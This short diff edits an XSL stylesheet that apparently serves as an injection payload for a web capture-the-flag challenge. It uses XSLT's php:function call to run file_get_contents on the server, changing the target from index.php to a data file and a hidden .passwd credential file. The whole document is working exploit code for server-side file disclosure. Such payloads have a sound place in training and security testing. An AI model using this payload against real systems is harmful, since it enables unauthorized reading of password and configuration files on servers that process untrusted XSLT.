@@ -5,7 +5,11 @@
   <xsl:output method="html"/>
   <xsl:template match="/">
     <pre>
-<xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/index.php')"/>
+BEERS.XML:
+<xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/beers.xml')"/>
+
+PASSWD:
+<xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/.passwd')"/>
     </pre>
   </xsl:template>
 </xsl:stylesheet>
